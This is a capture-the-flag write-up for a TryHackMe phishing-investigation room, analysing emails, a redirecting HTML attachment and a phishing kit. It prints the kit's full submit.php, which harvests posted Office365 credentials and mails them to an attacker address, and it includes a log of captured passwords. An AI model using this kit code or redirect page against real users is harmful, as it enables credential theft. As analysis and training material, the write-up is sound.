# [TryHackMe | Snapped Phish-ing Line](https://tryhackme.com/room/snappedphishingline) Challenge Room Solution Writeup

### Begin reviewing the emails in the phish-emails folder on your desktop. Which individual received the email regarding a Quote for Services Rendered?

**William McClean**

### What email address was used by the adversary to send the phishing emails?

The defanged email address is **Accounts[.]Payable[@]groupmarketingonline[.]icu**.

### Investigate the attachment in the email addressed to Zoe Duncan. What is the root domain of the redirection URL found within the file?

Examine `Direct Credit Advice.html` in a text editor.

```html
<!DOCTYPE html>
<html>
<head>
	<title>Redirecting. . .</title>
	<meta http-equiv="refresh" content="0;URL='http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&error'" />
</head>
<body>
	<h1>Redirecting. . .</h1>
	<p>If you are not redirected automatically, please click <a href="http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&error">here</a>.</p>
</body>
</html>
```

The defanged root domain of the redirection URL is **kennaroads[.]buzz**.

### Open the attachment in your VM web browser. Which company is the login page impersonating?

**Microsoft**

### Let’s check if the attacker left any files exposed on the same website. Navigate to the /data directory. What is the name of the archive file?

**Update365.zip**

### Download the phishing kit archive to your virtual environment. Using the sha256sum command, what is the SHA256 hash of the file?

Use `sha256sum` to get the `SHA256` hash of `Update365.zip`.

```bash
sha256sum Desktop/phish-emails/Update365.zip 
ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686  Desktop/phish-emails/Update365.zip
```

The `SHA256` hash is **ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686**.

### Investigate the file hash from the previous question using VirusTotal (opens in new tab). Aside from phishing, what other threat category is assigned to the ZIP archive?

**Trojan**

### Review the VirusTotal Details page for the phishing kit. How many files are contained within the archive?

**49**

### Let’s see if the attacker has exposed any captured credentials. Navigate to the /data/Update365/ directory and investigate the log file. What is the email address of the user who submitted their credentials more than once?

Examine `log.txt` in a text editor.

```bash
---------+ Office365 Login  |+-------
Email : isaiah.puzon@gmail.com
Password : PhishMOMUKAMO123!
-----------------------------------
Client IP: 158.62.17.197
User Agent : Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Country : Philippines
Date: Mon Jun 29, 2020 10:00 am
--- http://www.geoiptool.com/?IP=158.62.17.197 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michael.ascot@swiftspend.finance
Password : Invoice2023!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : zoe.duncan@swiftspend.finance
Password : Passw0rd1!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michael.ascot@swiftspend.finance
Password : Invoice2023!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : derick.marshall@swiftspend.finance
Password : lol
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michelle.chen@swiftspend.finance
Password : testing123
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
```

The defanged email address belonging to the person who submitted their credentials more than once is **michael[.]ascot[@]swiftspend[.]finance**.

### Extract the phishing kit archive and locate the submit.php file. What email address is used by the adversary to collect compromised credentials?

Examine `submit.php` in a text editor.

```php
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

function random_number(){
	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key = array_rand($numbers);
	return $numbers[$key];
}

$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
header('location:'.$url);

$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$from = $_SERVER['SERVER_NAME'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$email = $_POST['email'];
$password = $_POST['password'];
$passchk = strlen($password);


$message .= "---------+ Office365 Login  |+-------\n";
$message .= "Email : ".$email."\n";
$message .= "Password : ".$password."\n";
$message .= "-----------------------------------\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "--+ Created BY Real Carder +---\n";


$send = "m3npat@yandex.com";

$bron = "Outlook update $ip | Office365";
$lagi = "MIME-Version: 1.0\n";
$lagi = "From: $ip <no-reply@$from>";

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
	$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

if ($passchk < 6)
{
$passerr = 0;
}
else
{
$passerr = 1;
}


if ($passerr == 0)
{
header("Location: index.php?$url&email=$email&error=2");
}
else
{
mail("m3npat@yandex.com",$bron,$message,$lagi);
header("Location: retry.php?$url&email=$email&error=2");
}

?>
```

The defanged email address is **m3npat[@]yandex[.]com**.

### Return to the phishing URL and locate the flag.txt file. Using CyberChef (opens in new tab) to decode the flag, what is the secret value?

Use `curl` to retrieve the encoded flag.

```bash
curl -s http://kennaroads.buzz/data/Update365/office365/flag.txt
The secret is:
fUxSVV8zSHRfaFQxd195NExwe01IVAo=
```

Decoding with `CyberChef` using the recipe of `From Base64` and `Reverse By Character` gives the flag **THM{pL4y_w1Th_tH3_URL}**.